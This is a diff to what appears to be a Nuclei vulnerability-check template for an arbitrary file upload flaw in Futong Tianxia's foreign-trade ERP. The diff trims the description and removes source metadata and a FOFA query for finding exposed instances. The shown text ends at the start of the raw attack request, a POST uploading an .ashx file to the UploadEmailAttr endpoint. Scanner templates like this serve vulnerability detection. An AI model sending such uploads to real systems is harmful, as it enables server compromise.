@@ -3,14 +3,8 @@ info:
   name: 富通天下外贸ERPUploadEmailAttr存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3a4e612081e5f7c8630091d164b8f708
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 3a4e612081e5f7c8630091d164b8f708
-    fofa: + fofa`title="用户登录_富通天下外贸ERP"`
 http:
 - raw:
   - 'POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
